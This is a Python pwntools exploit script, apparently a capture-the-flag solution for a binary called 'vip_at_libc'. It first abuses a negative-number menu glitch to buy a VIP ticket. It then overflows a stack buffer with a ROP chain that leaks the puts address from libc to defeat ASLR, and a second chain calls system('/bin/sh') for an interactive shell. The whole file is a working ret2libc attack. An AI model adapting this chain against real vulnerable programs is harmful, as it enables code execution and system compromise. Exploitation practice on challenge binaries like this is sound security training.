#!/bin/env python3

from pwn import *
from pprint import pprint
import sys

ELF_LOADED	= ELF('./bin/vip_at_libc')
LIB_LOADED	= ELF('./bin/libc.so.6')
ROP_1		= ROP(ELF_LOADED)

PUT_GOT = ELF_LOADED.got['puts']
MAIN_PTR = ELF_LOADED.symbols['main']

### ROPZ
POP_RDI_RET = ROP_1.find_gadget(["pop rdi", "ret"])[0]
POP_RDI = ROP_1.find_gadget(["pop rdi"])[0]
RET = ROP_1.find_gadget(["ret"])[0]

context.arch = 'amd64'
context.binary = ELF_LOADED

ENV = {"LD_PRELOAD": "./libc.so.6"}
PROCESS = ELF_LOADED.process(env=ENV)
# gdb.attach(PROCESS.pid, """
# 	b access_lounge
# 	c
# 	""")
gdb.attach(PROCESS.pid, """
	c
	""")



def CheakyCheat():
	# PREPARE
	PROCESS.sendline(b"Pix")

	PROCESS.sendline(b"2")             # unlimited glitch
	PROCESS.sendline(b"1")             #
	PROCESS.sendline(b"-999999")       #

	PROCESS.sendline(b"1")             # Print money

	PROCESS.sendline(b"3")             # Buy the VIP ticket
	PROCESS.sendline(b"1")             #

	PROCESS.sendline(b"4")             # select lounge
	print(PROCESS.clean().decode('latin1'))

OFFSET = 'A' * 24

log.info("Leaking puts addr")
ROP_1.raw(OFFSET)
ROP_1.puts(PUT_GOT)
ROP_1.call(MAIN_PTR)
log.info("Rop chain numero 1:\n" + ROP_1.dump())

CheakyCheat()

LEAKED_PUT = PROCESS.sendline(ROP_1.chain())

PROCESS.recvuntil(b"You can access it whenever you want.\n\n\n")

LEAKED_PUT = PROCESS.recvline()[:8].strip()

log.success("Leaked puts@GLIBC: {}".format(LEAKED_PUT))
LEAKED_PUT = int.from_bytes(LEAKED_PUT, byteorder='little')
log.success("Converted puts@GLIBC: {}".format(hex(LEAKED_PUT)))

LIB_LOADED.address = LEAKED_PUT - LIB_LOADED.symbols["puts"]

# Should be assigned after finding the new base
BINSH_PTR = next(LIB_LOADED.search(b'/bin/sh'))
SYSTEM_PTR = LIB_LOADED.symbols['system']

log.info("Executing final ROP")
ROP_2 = ROP(ELF_LOADED)
ROP_2.raw(OFFSET)
ROP_2.raw(POP_RDI)
ROP_2.raw(BINSH_PTR)
ROP_2.raw(RET)
ROP_2.raw(SYSTEM_PTR)

CheakyCheat()
log.info("Rop chain numero 2:\n" + ROP_2.dump())

PROCESS.sendline(ROP_2.chain())

PROCESS.interactive()

# +--------------------+--------------------+---------------------+-----------------+
# |                    |                    |                     |                 |
# | junk "A" * 24      | pop rdi ret gadget | ptr to "/bin/sh"    | ptr to system   |
# |                    |                    |                     |                 |
# +--------------------+--------------------+---------------------+-----------------+

#https://stacklikemind.io/ret2libc-aslr
